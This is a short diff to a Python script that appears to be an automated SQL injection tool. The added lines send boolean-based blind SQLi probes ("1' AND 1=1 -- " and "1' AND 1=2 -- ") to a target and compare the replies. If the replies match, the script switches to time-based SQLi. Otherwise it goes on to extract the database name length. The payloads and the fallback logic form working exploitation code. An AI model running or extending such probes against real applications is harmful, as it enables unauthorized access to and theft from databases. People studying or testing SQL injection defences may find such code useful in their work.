@@ -2,6 +2,12 @@ import blind_based
 
 def try_blind_based():
     print("\n=== Falling back to Boolean-based Blind SQLi ===")
+    true_res = blind_based.send("1' AND 1=1 -- ")
+    false_res = blind_based.send("1' AND 1=2 -- ")
+    if true_res == false_res:
+        print("[!] Boolean-based not reliable. Switching to Time-based SQLi.")
+        return False
+    
     length = blind_based.get_database_length()
     if length is None:
         print("[-] Couldn't find db_name_length")
